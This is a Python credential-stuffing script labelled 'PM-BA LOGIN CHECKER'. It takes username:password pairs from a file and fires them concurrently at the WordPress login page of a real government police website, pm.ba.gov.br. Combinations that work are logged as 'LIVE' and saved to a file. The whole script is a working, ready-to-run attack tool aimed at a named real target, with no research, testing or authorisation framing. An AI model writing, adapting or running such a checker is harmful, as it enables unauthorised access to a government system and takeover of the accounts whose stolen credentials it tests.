import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import time
import os

init(autoreset=True)

# Configurações
MAX_THREADS = 20
TIMEOUT = 10
LOGINS_FILE = 'usuarios.txt'
LIVE_FILE = 'live.txt'
ERROR_FILE = 'errors.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

# Painel de status
def show_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      PM-BA LOGIN CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def save_result(filename, content):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except:
        pass

def check_login(username, password):
    url = "http://www.pm.ba.gov.br/wp-login.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Acessar",
        "redirect_to": "http://www.pm.ba.gov.br/wp-admin/",
        "testcookie": "1"
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=TIMEOUT, allow_redirects=True)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        if soup.title and "painel" in soup.title.string.lower():
            stats['live'] += 1
            save_result(LIVE_FILE, f"{username}:{password}")
            return f"{Fore.GREEN}[+] LIVE | {username}:{password}"
        else:
            stats['die'] += 1
            return f"{Fore.RED}[-] DIE | {username}:{password}"
            
    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, f"{username}:{password} | {str(e)}")
        return f"{Fore.YELLOW}[!] ERROR | {username}:{password} | {str(e)[:30]}"

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"[!] Arquivo {LOGINS_FILE} não encontrado!")
        return

    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao ler arquivo: {e}")
        return

    stats['total'] = len(accounts)
    show_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            username, password = acc[0], acc[1]
            futures.append(executor.submit(check_login, username, password))

        for future in as_completed(futures):
            print(future.result())
            show_panel()

    print(Fore.GREEN + "\n[+] Verificação concluída!")

if __name__ == "__main__":
    main()